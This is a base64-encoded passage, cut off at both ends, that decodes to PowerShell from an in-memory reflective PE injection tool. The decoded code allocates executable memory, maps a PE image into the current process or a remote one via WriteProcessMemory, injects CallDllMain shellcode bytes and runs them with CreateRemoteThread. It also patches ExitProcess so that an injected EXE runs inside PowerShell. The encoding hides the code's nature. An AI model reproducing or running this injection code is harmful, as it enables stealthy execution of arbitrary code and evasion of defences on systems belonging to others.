gICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFBFSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLlZpcnR1YWxBbGxvYy5JbnZva2UoJExvYWRBZGRyLCBbVUludFB0cl0kUEVJbmZvLlNpemVPZkltYWdlLCAkV2luMzJDb25zdGFudHMuTUVNX0NPTU1JVCAtYm9yICRXaW4zMkNvbnN0YW50cy5NRU1fUkVTRVJWRSwgJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFEV1JJVEUpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJEVmZmVjdGl2ZVBFSGFuZGxlID0gJFBFSGFuZGxlCiAgICAgICAgfQogICAgICAgIAogICAgICAgIFtJbnRQdHJdJFBFRW5kQWRkcmVzcyA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVIYW5kbGUpIChbSW50NjRdJFBFSW5mby5TaXplT2ZJbWFnZSkKICAgICAgICBpZiAoJFBFSGFuZGxlIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICB7IAogICAgICAgICAgICBUaHJvdyAiVmlydHVhbEFsbG9jIGZhaWxlZCB0byBhbGxvY2F0ZSBtZW1vcnkgZm9yIFBFLiBJZiBQRSBpcyBub3QgQVNMUiBjb21wYXRpYmxlLCB0cnkgcnVubmluZyB0aGUgc2NyaXB0IGluIGEgbmV3IFBvd2VyU2hlbGwgcHJvY2VzcyAodGhlIG5ldyBQb3dlclNoZWxsIHByb2Nlc3Mgd2lsbCBoYXZlIGEgZGlmZmVyZW50IG1lbW9yeSBsYXlvdXQsIHNvIHRoZSBhZGRyZXNzIHRoZSBQRSB3YW50cyBtaWdodCBiZSBmcmVlKS4iCiAgICAgICAgfSAgICAgICAKICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpDb3B5KCRQRUJ5dGVzLCAwLCAkUEVIYW5kbGUsICRQRUluZm8uU2l6ZU9mSGVhZGVycykgfCBPdXQtTnVsbAogICAgICAgIAogICAgICAgIAogICAgICAgICNOb3cgdGhhdCB0aGUgUEUgaXMgaW4gbWVtb3J5LCBnZXQgbW9yZSBkZXRhaWxlZCBpbmZvcm1hdGlvbiBhYm91dCBpdAogICAgICAgIFdyaXRlLVZlcmJvc2UgIkdldHRpbmcgZGV0YWlsZWQgUEUgaW5mb3JtYXRpb24gZnJvbSB0aGUgaGVhZGVycyBsb2FkZWQgaW4gbWVtb3J5IgogICAgICAgICRQRUluZm8gPSBHZXQtUEVEZXRhaWxlZEluZm8gLVBFSGFuZGxlICRQRUhhbmRsZSAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCiAgICAgICAgJFBFSW5mbyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lIEVuZEFkZHJlc3MgLVZhbHVlICRQRUVuZEFkZHJlc3MKICAgICAgICAkUEVJbmZvIHwgQWRkLU1lbWJlciAtTWVtYmVyVHlwZSBOb3RlUHJvcGVydHkgLU5hbWUgRWZmZWN0aXZlUEVIYW5kbGUgLVZhbHVlICRFZmZlY3RpdmVQRUhhbmRsZQogICAgICAgIFdyaXRlLVZlcmJvc2UgIlN0YXJ0QWRkcmVzczogJChHZXQtSGV4ICRQRUhhbmRsZSkgICAgRW5kQWRkcmVzczogJChHZXQtSGV4ICRQRUVuZEFkZHJlc3MpIgogICAgICAgIAogICAgICAgIAogICAgICAgICNDb3B5IGVhY2ggc2VjdGlvbiBmcm9tIHRoZSBQRSBpbiB0byBtZW1vcnkKICAgICAgICBXcml0ZS1WZXJib3NlICJDb3B5IFBFIHNlY3Rpb25zIGluIHRvIG1lbW9yeSIKICAgICAgICBDb3B5LVNlY3Rpb25zIC1QRUJ5dGVzICRQRUJ5dGVzIC1QRUluZm8gJFBFSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzCiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI1VwZGF0ZSB0aGUgbWVtb3J5IGFkZHJlc3NlcyBoYXJkY29kZWQgaW4gdG8gdGhlIFBFIGJhc2VkIG9uIHRoZSBtZW1vcnkgYWRkcmVzcyB0aGUgUEUgd2FzIGV4cGVjdGluZyB0byBiZSBsb2FkZWQgdG8gdnMgd2hlcmUgaXQgd2FzIGFjdHVhbGx5IGxvYWRlZAogICAgICAgIFdyaXRlLVZlcmJvc2UgIlVwZGF0ZSBtZW1vcnkgYWRkcmVzc2VzIGJhc2VkIG9uIHdoZXJlIHRoZSBQRSB3YXMgYWN0dWFsbHkgbG9hZGVkIGluIG1lbW9yeSIKICAgICAgICBVcGRhdGUtTWVtb3J5QWRkcmVzc2VzIC1QRUluZm8gJFBFSW5mbyAtT3JpZ2luYWxJbWFnZUJhc2UgJE9yaWdpbmFsSW1hZ2VCYXNlIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMgLVdpbjMyVHlwZXMgJFdpbjMyVHlwZXMKCiAgICAgICAgCiAgICAgICAgI1RoZSBQRSB3ZSBhcmUgaW4tbWVtb3J5IGxvYWRpbmcgaGFzIERMTHMgaXQgbmVlZHMsIGltcG9ydCB0aG9zZSBETExzIGZvciBpdAogICAgICAgIFdyaXRlLVZlcmJvc2UgIkltcG9ydCBETEwncyBuZWVkZWQgYnkgdGhlIFBFIHdlIGFyZSBsb2FkaW5nIgogICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpCiAgICAgICAgewogICAgICAgICAgICBJbXBvcnQtRGxsSW1wb3J0cyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzIC1SZW1vdGVQcm9jSGFuZGxlICRSZW1vdGVQcm9jSGFuZGxlCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIEltcG9ydC1EbGxJbXBvcnRzIC1QRUluZm8gJFBFSW5mbyAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zIC1XaW4zMlR5cGVzICRXaW4zMlR5cGVzIC1XaW4zMkNvbnN0YW50cyAkV2luMzJDb25zdGFudHMKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI1VwZGF0ZSB0aGUgbWVtb3J5IHByb3RlY3Rpb24gZmxhZ3MgZm9yIGFsbCB0aGUgbWVtb3J5IGp1c3QgYWxsb2NhdGVkCiAgICAgICAgaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkZmFsc2UpCiAgICAgICAgewogICAgICAgICAgICBpZiAoJE5YQ29tcGF0aWJsZSAtZXEgJHRydWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlVwZGF0ZSBtZW1vcnkgcHJvdGVjdGlvbiBmbGFncyIKICAgICAgICAgICAgICAgIFVwZGF0ZS1NZW1vcnlQcm90ZWN0aW9uRmxhZ3MgLVBFSW5mbyAkUEVJbmZvIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cyAtV2luMzJUeXBlcyAkV2luMzJUeXBlcwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiUEUgYmVpbmcgcmVmbGVjdGl2ZWx5IGxvYWRlZCBpcyBub3QgY29tcGF0aWJsZSB3aXRoIE5YIG1lbW9yeSwga2VlcGluZyBtZW1vcnkgYXMgcmVhZCB3cml0ZSBleGVjdXRlIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIlBFIGJlaW5nIGxvYWRlZCBpbiB0byBhIHJlbW90ZSBwcm9jZXNzLCBub3QgYWRqdXN0aW5nIG1lbW9yeSBwZXJtaXNzaW9ucyIKICAgICAgICB9CiAgICAgICAgCiAgICAgICAgCiAgICAgICAgI0lmIHJlbW90ZSBsb2FkaW5nLCBjb3B5IHRoZSBETEwgaW4gdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5CiAgICAgICAgaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgIFtVSW50MzJdJE51bUJ5dGVzV3JpdHRlbiA9IDAKICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJEVmZmVjdGl2ZVBFSGFuZGxlLCAkUEVIYW5kbGUsIFtVSW50UHRyXSgkUEVJbmZvLlNpemVPZkltYWdlKSwgW1JlZl0kTnVtQnl0ZXNXcml0dGVuKQogICAgICAgICAgICBpZiAoJFN1Y2Nlc3MgLWVxICRmYWxzZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byB3cml0ZSBzaGVsbGNvZGUgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5LiIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICAKICAgICAgICAjQ2FsbCB0aGUgZW50cnkgcG9pbnQsIGlmIHRoaXMgaXMgYSBETEwgdGhlIGVudHJ5cG9pbnQgaXMgdGhlIERsbE1haW4gZnVuY3Rpb24sIGlmIGl0IGlzIGFuIEVYRSBpdCBpcyB0aGUgTWFpbiBmdW5jdGlvbgogICAgICAgIGlmICgkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkRMTCIpCiAgICAgICAgewogICAgICAgICAgICBpZiAoJFJlbW90ZUxvYWRpbmcgLWVxICRmYWxzZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiQ2FsbGluZyBkbGxtYWluIHNvIHRoZSBETEwga25vd3MgaXQgaGFzIGJlZW4gbG9hZGVkIgogICAgICAgICAgICAgICAgJERsbE1haW5QdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5QRUhhbmRsZSkgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5BZGRyZXNzT2ZFbnRyeVBvaW50KQogICAgICAgICAgICAgICAgJERsbE1haW5EZWxlZ2F0ZSA9IEdldC1EZWxlZ2F0ZVR5cGUgQChbSW50UHRyXSwgW1VJbnQzMl0sIFtJbnRQdHJdKSAoW0Jvb2xdKQogICAgICAgICAgICAgICAgJERsbE1haW4gPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpHZXREZWxlZ2F0ZUZvckZ1bmN0aW9uUG9pbnRlcigkRGxsTWFpblB0ciwgJERsbE1haW5EZWxlZ2F0ZSkKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJERsbE1haW4uSW52b2tlKCRQRUluZm8uUEVIYW5kbGUsIDEsIFtJbnRQdHJdOjpaZXJvKSB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkRGxsTWFpblB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkRWZmZWN0aXZlUEVIYW5kbGUpICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuQWRkcmVzc09mRW50cnlQb2ludCkKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpZiAoJFBFSW5mby5QRTY0Qml0IC1lcSAkdHJ1ZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAjU2hlbGxjb2RlOiBDYWxsRGxsTWFpbi5hc20KICAgICAgICAgICAgICAgICAgICAkQ2FsbERsbE1haW5TQzEgPSBAKDB4NTMsIDB4NDgsIDB4ODksIDB4ZTMsIDB4NjYsIDB4ODMsIDB4ZTQsIDB4MDAsIDB4NDgsIDB4YjkpCiAgICAgICAgICAgICAgICAgICAgJENhbGxEbGxNYWluU0MyID0gQCgweGJhLCAweDAxLCAweDAwLCAweDAwLCAweDAwLCAweDQxLCAweGI4LCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDQ4LCAweGI4KQogICAgICAgICAgICAgICAgICAgICRDYWxsRGxsTWFpblNDMyA9IEAoMHhmZiwgMHhkMCwgMHg0OCwgMHg4OSwgMHhkYywgMHg1YiwgMHhjMykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAjU2hlbGxjb2RlOiBDYWxsRGxsTWFpbi5hc20KICAgICAgICAgICAgICAgICAgICAkQ2FsbERsbE1haW5TQzEgPSBAKDB4NTMsIDB4ODksIDB4ZTMsIDB4ODMsIDB4ZTQsIDB4ZjAsIDB4YjkpCiAgICAgICAgICAgICAgICAgICAgJENhbGxEbGxNYWluU0MyID0gQCgweGJhLCAweDAxLCAweDAwLCAweDAwLCAweDAwLCAweGI4LCAweDAwLCAweDAwLCAweDAwLCAweDAwLCAweDUwLCAweDUyLCAweDUxLCAweGI4KQogICAgICAgICAgICAgICAgICAgICRDYWxsRGxsTWFpblNDMyA9IEAoMHhmZiwgMHhkMCwgMHg4OSwgMHhkYywgMHg1YiwgMHhjMykKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRTQ0xlbmd0aCA9ICRDYWxsRGxsTWFpblNDMS5MZW5ndGggKyAkQ2FsbERsbE1haW5TQzIuTGVuZ3RoICsgJENhbGxEbGxNYWluU0MzLkxlbmd0aCArICgkUHRyU2l6ZSAqIDIpCiAgICAgICAgICAgICAgICAkU0NQU01lbSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgkU0NMZW5ndGgpCiAgICAgICAgICAgICAgICAkU0NQU01lbU9yaWdpbmFsID0gJFNDUFNNZW0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJENhbGxEbGxNYWluU0MxIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkQ2FsbERsbE1haW5TQzEuTGVuZ3RoKQogICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEVmZmVjdGl2ZVBFSGFuZGxlLCAkU0NQU01lbSwgJGZhbHNlKQogICAgICAgICAgICAgICAgJFNDUFNNZW0gPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAkU0NQU01lbSAoJFB0clNpemUpCiAgICAgICAgICAgICAgICBXcml0ZS1CeXRlc1RvTWVtb3J5IC1CeXRlcyAkQ2FsbERsbE1haW5TQzIgLU1lbW9yeUFkZHJlc3MgJFNDUFNNZW0KICAgICAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRDYWxsRGxsTWFpblNDMi5MZW5ndGgpCiAgICAgICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTdHJ1Y3R1cmVUb1B0cigkRGxsTWFpblB0ciwgJFNDUFNNZW0sICRmYWxzZSkKICAgICAgICAgICAgICAgICRTQ1BTTWVtID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFNDUFNNZW0gKCRQdHJTaXplKQogICAgICAgICAgICAgICAgV3JpdGUtQnl0ZXNUb01lbW9yeSAtQnl0ZXMgJENhbGxEbGxNYWluU0MzIC1NZW1vcnlBZGRyZXNzICRTQ1BTTWVtCiAgICAgICAgICAgICAgICAkU0NQU01lbSA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICRTQ1BTTWVtICgkQ2FsbERsbE1haW5TQzMuTGVuZ3RoKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkUlNDQWRkciA9ICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsQWxsb2NFeC5JbnZva2UoJFJlbW90ZVByb2NIYW5kbGUsIFtJbnRQdHJdOjpaZXJvLCBbVUludFB0cl1bVUludDY0XSRTQ0xlbmd0aCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9DT01NSVQgLWJvciAkV2luMzJDb25zdGFudHMuTUVNX1JFU0VSVkUsICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFKQogICAgICAgICAgICAgICAgaWYgKCRSU0NBZGRyIC1lcSBbSW50UHRyXTo6WmVybykKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGFsbG9jYXRlIG1lbW9yeSBpbiB0aGUgcmVtb3RlIHByb2Nlc3MgZm9yIHNoZWxsY29kZSIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuV3JpdGVQcm9jZXNzTWVtb3J5Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsICRTQ1BTTWVtT3JpZ2luYWwsIFtVSW50UHRyXVtVSW50NjRdJFNDTGVuZ3RoLCBbUmVmXSROdW1CeXRlc1dyaXR0ZW4pCiAgICAgICAgICAgICAgICBpZiAoKCRTdWNjZXNzIC1lcSAkZmFsc2UpIC1vciAoW1VJbnQ2NF0kTnVtQnl0ZXNXcml0dGVuIC1uZSBbVUludDY0XSRTQ0xlbmd0aCkpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgVGhyb3cgIlVuYWJsZSB0byB3cml0ZSBzaGVsbGNvZGUgdG8gcmVtb3RlIHByb2Nlc3MgbWVtb3J5LiIKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICAkUlRocmVhZEhhbmRsZSA9IENyZWF0ZS1SZW1vdGVUaHJlYWQgLVByb2Nlc3NIYW5kbGUgJFJlbW90ZVByb2NIYW5kbGUgLVN0YXJ0QWRkcmVzcyAkUlNDQWRkciAtV2luMzJGdW5jdGlvbnMgJFdpbjMyRnVuY3Rpb25zCiAgICAgICAgICAgICAgICAkUmVzdWx0ID0gJFdpbjMyRnVuY3Rpb25zLldhaXRGb3JTaW5nbGVPYmplY3QuSW52b2tlKCRSVGhyZWFkSGFuZGxlLCAyMDAwMCkKICAgICAgICAgICAgICAgIGlmICgkUmVzdWx0IC1uZSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFRocm93ICJDYWxsIHRvIENyZWF0ZVJlbW90ZVRocmVhZCB0byBjYWxsIEdldFByb2NBZGRyZXNzIGZhaWxlZC4iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICRXaW4zMkZ1bmN0aW9ucy5WaXJ0dWFsRnJlZUV4Lkludm9rZSgkUmVtb3RlUHJvY0hhbmRsZSwgJFJTQ0FkZHIsIFtVSW50UHRyXVtVSW50NjRdMCwgJFdpbjMyQ29uc3RhbnRzLk1FTV9SRUxFQVNFKSB8IE91dC1OdWxsCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUEVJbmZvLkZpbGVUeXBlIC1pZXEgIkVYRSIpCiAgICAgICAgewogICAgICAgICAgICAjT3ZlcndyaXRlIEdldENvbW1hbmRMaW5lIGFuZCBFeGl0UHJvY2VzcyBzbyB3ZSBjYW4gcHJvdmlkZSBvdXIgb3duIGFyZ3VtZW50cyB0byB0aGUgRVhFIGFuZCBwcmV2ZW50IGl0IGZyb20ga2lsbGluZyB0aGUgUFMgcHJvY2VzcwogICAgICAgICAgICBbSW50UHRyXSRFeGVEb25lQnl0ZVB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkFsbG9jSEdsb2JhbCgxKQogICAgICAgICAgICBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpXcml0ZUJ5dGUoJEV4ZURvbmVCeXRlUHRyLCAwLCAweDAwKQogICAgICAgICAgICAkT3ZlcndyaXR0ZW5NZW1JbmZvID0gVXBkYXRlLUV4ZUZ1bmN0aW9ucyAtUEVJbmZvICRQRUluZm8gLVdpbjMyRnVuY3Rpb25zICRXaW4zMkZ1bmN0aW9ucyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzIC1FeGVBcmd1bWVudHMgJEV4ZUFyZ3MgLUV4ZURvbmVCeXRlUHRyICRFeGVEb25lQnl0ZVB0cgoKICAgICAgICAgICAgI0lmIHRoaXMgaXMgYW4gRVhFLCBjYWxsIHRoZSBlbnRyeSBwb2ludCBpbiBhIG5ldyB0aHJlYWQuIFdlIGhhdmUgb3ZlcndyaXR0ZW4gdGhlIEV4aXRQcm9jZXNzIGZ1bmN0aW9uIHRvIGluc3RlYWQgRXhpdFRocmVhZAogICAgICAgICAgICAjICAgVGhpcyB3YXkgdGhlIHJlZmxlY3RpdmVseSBsb2FkZWQgRVhFIHdvbid0IGtpbGwgdGhlIHBvd2Vyc2hlbGwgcHJvY2VzcyB3aGVuIGl0IGV4aXRzLCBpdCB3aWxsIGp1c3Qga2lsbCBpdHMgb3duIHRocmVhZC4KICAgICAgICAgICAgW0ludFB0cl0kRXhlTWFpblB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkFkZHJlc3NPZkVudHJ5UG9pbnQpCiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkNhbGwgRVhFIE1haW4gZnVuY3Rpb24uIEFkZHJlc3M6ICQoR2V0LUhleCAkRXhlTWFpblB0cikuIENyZWF0aW5nIHRocmVhZCBmb3IgdGhlIEVYRSB0byBydW4gaW4uIgoKICAgICAgICAgICAgJFdpbjMyRnVuY3Rpb25zLkNyZWF0ZVRocmVhZC5JbnZva2UoW0ludFB0cl06Olplcm8sIFtJbnRQdHJdOjpaZXJvLCAkRXhlTWFpblB0ciwgW0ludFB0cl06Olplcm8sIChbVUludDMyXTApLCBbUmVmXShbVUludDMyXTApKSB8IE91dC1OdWxsCgogICAgICAgICAgICB3aGlsZSgkdHJ1ZSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgW0J5dGVdJFRocmVhZERvbmUgPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpSZWFkQnl0ZSgkRXhlRG9uZUJ5dGVQdHIsIDApCiAgICAgICAgICAgICAgICBpZiAoJFRocmVhZERvbmUgLWVxIDEpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgQ29weS1BcnJheU9mTWVtQWRkcmVzc2VzIC1Db3B5SW5mbyAkT3ZlcndyaXR0ZW5NZW1JbmZvIC1XaW4zMkZ1bmN0aW9ucyAkV2luMzJGdW5jdGlvbnMgLVdpbjMyQ29uc3RhbnRzICRXaW4zMkNvbnN0YW50cwogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkVYRSB0aHJlYWQgaGFzIGNvbXBsZXRlZC4iCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAxCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgCiAgICAgICAgcmV0dXJuIEAoJFBFSW5mby5QRUhhbmRsZSwgJEVmZmVjdGl2ZVBFSGFuZGxlKQogICAgfQogICAgCiAgICAKICAgIEZ1bmN0aW9uIEludm9rZS1NZW1vcnlGcmVlTGlicmFyeQogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb249MCwgTWFuZGF0b3J5PSR0cnVlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRQRUhhbmRsZQogICAgICAgICkKICAgICAgICAKICAgICAgICAjR2V0IFdpbjMyIGNvbnN0YW50cyBhbmQgZnVuY3Rpb25zCiAgICAgICAgJFdpbjMyQ29uc3RhbnRzID0gR2V0LVdpbjMyQ29uc3RhbnRzCiAgICAgICAgJFdpbjMyRnVuY3Rpb25zID0gR2V0LVdpbjMyRnVuY3Rpb25zCiAgICAgICAgJFdpbjMyVHlwZXMgPSBHZXQtV2luMzJUeXBlcwogICAgICAgIAogICAgICAgICRQRUluZm8gPSBHZXQtUEVEZXRhaWxlZEluZm8gLVBFSGFuZGxlICRQRUhhbmRsZSAtV2luMzJUeXBlcyAkV2luMzJUeXBlcyAtV2luMzJDb25zdGFudHMgJFdpbjMyQ29uc3RhbnRzCiAgICAgICAgCiAgICAgICAgI0NhbGwgRnJlZUxpYnJhcnkgZm9yIGFsbCB0aGUgaW1wb3J0cyBvZiB0aGUgRExMCiAgICAgICAgaWYgKCRQRUluZm8uSU1BR0VfTlRfSEVBREVSUy5PcHRpb25hbEhlYWRlci5JbXBvcnRUYWJsZS5TaXplIC1ndCAwKQogICAgICAgIHsKICAgICAgICAgICAgW0ludFB0cl0kSW1wb3J0RGVzY3JpcHRvclB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuSW1wb3J0VGFibGUuVmlydHVhbEFkZHJlc3MpCiAgICAgICAgICAgIAogICAgICAgICAgICB3aGlsZSAoJHRydWUpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICRJbXBvcnREZXNjcmlwdG9yID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJEltcG9ydERlc2NyaXB0b3JQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX0lNUE9SVF9ERVNDUklQVE9SKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAjSWYgdGhlIHN0cnVjdHVyZSBpcyBudWxsLCBpdCBzaWduYWxzIHRoYXQgdGhpcyBpcyB0aGUgZW5kIG9mIHRoZSBhcnJheQogICAgICAgICAgICAgICAgaWYgKCRJbXBvcnREZXNjcmlwdG9yLkNoYXJhY3RlcmlzdGljcyAtZXEgMCBgCiAgICAgICAgICAgICAgICAgICAgICAgIC1hbmQgJEltcG9ydERlc2NyaXB0b3IuRmlyc3RUaHVuayAtZXEgMCBgCiAgICAgICAgICAgICAgICAgICAgICAgIC1hbmQgJEltcG9ydERlc2NyaXB0b3IuRm9yd2FyZGVyQ2hhaW4gLWVxIDAgYAogICAgICAgICAgICAgICAgICAgICAgICAtYW5kICRJbXBvcnREZXNjcmlwdG9yLk5hbWUgLWVxIDAgYAogICAgICAgICAgICAgICAgICAgICAgICAtYW5kICRJbXBvcnREZXNjcmlwdG9yLlRpbWVEYXRlU3RhbXAgLWVxIDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiRG9uZSB1bmxvYWRpbmcgdGhlIGxpYnJhcmllcyBuZWVkZWQgYnkgdGhlIFBFIgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJEltcG9ydERsbFBhdGggPSBbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpQdHJUb1N0cmluZ0Fuc2koKEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkIChbSW50NjRdJFBFSW5mby5QRUhhbmRsZSkgKFtJbnQ2NF0kSW1wb3J0RGVzY3JpcHRvci5OYW1lKSkpCiAgICAgICAgICAgICAgICAkSW1wb3J0RGxsSGFuZGxlID0gJFdpbjMyRnVuY3Rpb25zLkdldE1vZHVsZUhhbmRsZS5JbnZva2UoJEltcG9ydERsbFBhdGgpCgogICAgICAgICAgICAgICAgaWYgKCRJbXBvcnREbGxIYW5kbGUgLWVxICRudWxsKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIkVycm9yIGdldHRpbmcgRExMIGhhbmRsZSBpbiBNZW1vcnlGcmVlTGlicmFyeSwgRExMTmFtZTogJEltcG9ydERsbFBhdGguIENvbnRpbnVpbmcgYW55d2F5cyIgLVdhcm5pbmdBY3Rpb24gQ29udGludWUKICAgICAgICAgICAgICAgIH0KICAgI